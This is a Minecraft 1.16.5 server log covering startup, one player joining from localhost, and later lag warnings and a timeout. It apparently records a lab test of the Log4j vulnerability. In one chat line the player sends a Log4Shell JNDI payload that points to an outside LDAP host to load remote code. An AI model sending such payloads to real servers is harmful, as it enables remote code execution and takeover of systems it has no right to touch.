[13:51:10] [main/INFO]: Environment: authHost='https://authserver.mojang.com', accountsHost='https://api.mojang.com', sessionHost='https://sessionserver.mojang.com', servicesHost='https://api.minecraftservices.com', name='PROD'
[13:51:11] [main/WARN]: Ambiguity between arguments [teleport, destination] and [teleport, targets] with inputs: [Player, 0123, @e, dd12be42-52a9-4a91-a8a1-11c01849e498]
[13:51:11] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
[13:51:11] [main/WARN]: Ambiguity between arguments [teleport, location] and [teleport, targets] with inputs: [0.1 -0.5 .9, 0 0 0]
[13:51:11] [main/WARN]: Ambiguity between arguments [teleport, targets] and [teleport, destination] with inputs: [Player, 0123, dd12be42-52a9-4a91-a8a1-11c01849e498]
[13:51:11] [main/WARN]: Ambiguity between arguments [teleport, targets, location] and [teleport, targets, destination] with inputs: [0.1 -0.5 .9, 0 0 0]
[13:51:11] [main/INFO]: Reloading ResourceManager: Default
[13:51:12] [Worker-Main-14/INFO]: Loaded 7 recipes
[13:51:13] [Worker-Main-14/INFO]: Loaded 927 advancements
[13:51:16] [Server thread/INFO]: Starting minecraft server version 1.16.5
[13:51:16] [Server thread/INFO]: Loading properties
[13:51:16] [Server thread/INFO]: Default game type: SURVIVAL
[13:51:16] [Server thread/INFO]: Generating keypair
[13:51:16] [Server thread/INFO]: Starting Minecraft server on *:25565
[13:51:16] [Server thread/INFO]: Using default channel type
[13:51:26] [Server thread/INFO]: Preparing level "world"
[13:51:26] [Server thread/INFO]: Preparing start region for dimension minecraft:overworld
[13:51:28] [Server thread/INFO]: Preparing spawn area: 0%
[13:51:28] [Server thread/INFO]: Preparing spawn area: 0%
[13:51:28] [Server thread/INFO]: Preparing spawn area: 0%
[13:51:28] [Server thread/INFO]: Preparing spawn area: 0%
[13:51:28] [Server thread/INFO]: Preparing spawn area: 50%
[13:51:29] [Server thread/INFO]: Time elapsed: 2776 ms
[13:51:29] [Server thread/INFO]: Done (2.962s)! For help, type "help"
[13:51:47] [User Authenticator #1/INFO]: UUID of player happy411509 is 0954ed57-070f-4e3e-840a-7c9204d33e14
[13:51:48] [Server thread/INFO]: happy411509[/127.0.0.1:4207] logged in with entity id 171 at (57.30000001192093, 56.0, 35.81433627830528)
[13:51:48] [Server thread/INFO]: happy411509 joined the game
[13:52:49] [Server thread/INFO]: <happy411509> ${jndi:ldap://192.168.80.147:8888/Log4jRCE}
[13:52:56] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 6140ms or 122 ticks behind
[14:07:48] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 2028ms or 40 ticks behind
[14:10:16] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 73950ms or 1479 ticks behind
[14:10:19] [Server thread/INFO]: happy411509 lost connection: Timed out
[14:10:19] [Server thread/INFO]: happy411509 left the game
[14:13:32] [Server thread/INFO]: com.mojang.authlib.GameProfile@69d02f5e[id=<null>,name=happy411509,properties={},legacy=false] (/127.0.0.1:6298) lost connection: Disconnected
[14:13:35] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 2813ms or 56 ticks behind
